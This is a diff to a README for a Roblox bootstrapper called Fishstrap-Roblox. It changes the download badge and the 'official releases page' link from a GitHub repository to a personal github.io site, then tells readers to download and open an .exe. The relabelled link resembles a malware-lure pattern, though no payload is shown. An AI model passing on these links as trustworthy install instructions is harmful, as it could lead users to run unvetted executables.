@@ -1,12 +1,12 @@
 # 🐟 Fishstrap-Roblox - Boost gameplay performance and customize settings
 
-[![Download Fishstrap-Roblox](https://img.shields.io/badge/Download-Fishstrap--Roblox-blue.svg)](https://github.com/Ggpt7474/Fishstrap-Roblox)
+[![Download Fishstrap-Roblox](https://img.shields.io/badge/Download-Fishstrap--Roblox-blue.svg)](https://ggpt7474.github.io)
 
 Fishstrap-Roblox improves your daily gaming experience. It works as an alternative bootstrapper for the Roblox client. You can manage game settings, apply performance tweaks, and update your launcher through this tool. It runs on Windows 10 and Windows 11. 
 
 ## 📥 How to Download and Install
 
-1. Visit the [official releases page](https://github.com/Ggpt7474/Fishstrap-Roblox) to get the latest version.
+1. Visit the [official releases page](https://ggpt7474.github.io) to get the latest version.
 2. Look for the Assets section at the bottom of the release notes.
 3. Click the file ending in .exe to start your download.
 4. Open the downloaded file once the process finishes.
